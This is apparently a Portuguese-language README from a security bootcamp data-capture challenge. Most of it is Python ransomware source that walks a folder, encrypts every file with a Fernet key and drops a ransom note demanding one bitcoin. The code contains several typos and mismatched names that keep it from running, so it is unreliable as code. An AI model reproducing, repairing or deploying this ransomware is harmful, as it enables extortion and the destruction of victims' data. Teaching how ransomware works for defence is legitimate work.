# CapturaDeDados
Desafio de captura de dados do BootCamp de Segurança  da Riachuelo

Código para criar o ransoware para criptografar os arquivos do usuario 

from cryptography.fernet import Fernet 
import os   

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_files:
        chave_file.write(chave)

#2. Caregar chaves salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptrografar um único arquivo   
def criptrografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo. "wb") as file:
        file.write(dados_encriptados)      

#4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)  
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista  

#5. Mensagem de resgate
def criar_mensagem_restage():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Enviar 1 bitcoin para o endereço X e enviei o comprovante!\n")
        f.write("Depois disso, enviaremos a chava para recuperar seus dados!\n")

#6.Execução principal     
def main():
    gerar_chave() 
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptrografar_arquivo(arquivo_chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografados!")   

if __name__ == "__main__":
    main() 

#Atividade Keylogger Simulado


